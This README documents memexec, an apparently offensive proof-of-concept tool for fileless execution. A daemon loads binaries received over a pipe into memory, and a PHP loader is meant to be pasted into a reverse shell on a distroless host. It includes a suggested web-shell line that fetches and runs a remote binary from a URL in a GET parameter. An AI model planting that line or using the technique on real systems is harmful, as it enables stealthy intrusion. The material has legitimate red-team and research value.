# memexec

[At the moment this is just a proof of concept.]

`memexecd.c` is the code for the "daemonized" [DDexec](https://github.com/arget13/DDexec). This program *listens* on a pipe for requests, which are composed of:
- Size of arguments.
- Arguments (separated by nullbytes).
- Size of program.
- Raw program.
After a request is received it `fork()`s and the child will load and run the program received, while keeping the parent as *server*.  
It should be fairly easy to adapt to other IPC methods instead of pipes, like sockets (UNIX or network ones), or shared memory.

`a.php` was part of the demo at RootedCon. In case you get an inverse php shell on a **distroless** --without write permissions anywhere-- you can paste the contents of this file in order to load the daemon. Then perform requests to load and run remote binaries using the function `memexec()` defined in `a.php`.

It can be very a very interesting toy to play with, *e. g.* in web environments where you can't get a reverse interactive session you may want to add code like `memexec($_GET['url'], $_GET['args'])`, or modify it in order to read the program from a POST request, and show the output of its execution as web content.

`loader` and `loaderarm` are builds of `memexecd.c`, the shellcodes in `a.php` that load these binaries were generated by [DDexec](https://github.com/arget13/DDexec) and are specific for *these* binaries and won't work correctly when trying to load a different file. On the other hand this files (`loader` and `loaderarm`) aren't the files as produced by gcc because the shellcode only reads the pieces that the program needs loaded in memory, so further processing was made (also produced by DDexec). Additionally, this couple of files are statically compiled and non-PIE, so they are pretty heavy (almost 1MB) and can't load non-PIE binaries. By making a more generic shellcode I will be able to solve all of this problems, maybe even use [memdlopen](https://github.com/arget13/memdlopen) when fully ported to assembly.
